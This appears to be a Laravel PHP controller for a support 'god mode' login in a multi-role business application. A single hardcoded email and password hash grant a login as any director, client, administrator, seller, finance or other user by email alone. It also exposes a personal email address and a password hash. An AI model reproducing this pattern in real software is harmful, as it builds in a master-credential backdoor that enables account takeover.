<?php

namespace App\Http\Controllers\Soporte;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use Illuminate\Support\Facades\Auth;
use App\Models\Soporte;
use App\Models\Asociado;
use App\Models\Cliente;
use App\Models\Administrador;
use App\Models\Vendedor;
use App\Models\Recepcion;
use App\Models\Finanza;
use App\Models\Dosificador;
use App\Models\Sedema;
use App\Models\Dependencia;
use App\Models\Residente;
use App\Models\Director;
use App\Models\Transportista;

class ModoDiosController extends Controller
{
    function index(){
        return view('soporte.mododios.mododios');
    }

    function LoginMD(Request $request){
        
        if(password_verify($request->pass,'$2y$10$T6JnuHsj9Hjlt3F1y39rpOFB85bcagSSwHeAxg2h1PZckZAEvk/iy') && $request->mail=='neskirbi@gmail.com'){
            if($d=Director::where('mail',$request->correo)->first()){
                Auth::guard('directores')->login($d);
                return redirect('home');
            }

            if($cliente=Cliente::where('mail',$request->correo)->first()){
                Auth::guard('clientes')->login($cliente);
                return redirect('home');
            }

            if($administrador=Administrador::where('mail',$request->correo)->first()){
                Auth::guard('administradores')->login($administrador);
                return redirect('home');
                
            }

            if($ventas=Vendedor::where('mail',$request->correo)->first()){
                Auth::guard('ventas')->login($ventas);
                return redirect('home');
                
            }

            if($do=Dosificador::where('mail',$request->correo)->first()){
                Auth::guard('dosificadores')->login($do);
                return redirect('home');

                
            }

            if($finanza=Finanza::where('mail',$request->correo)->first()){
                Auth::guard('finanzas')->login($finanza);
                return redirect('home');

                
            }

            if($recepcion=Recepcion::where('mail',$request->correo)->first()){
                Auth::guard('recepciones')->login($recepcion);
                return redirect('home');

                
            }


            if($re=Residente::where('mail',$request->correo)->first()){
                Auth::guard('residentes')->login($re);
                return redirect('home');

                
            }
            return "no encontro ninguno";
            
        }else{
            return "fallo";
        }
    }
}
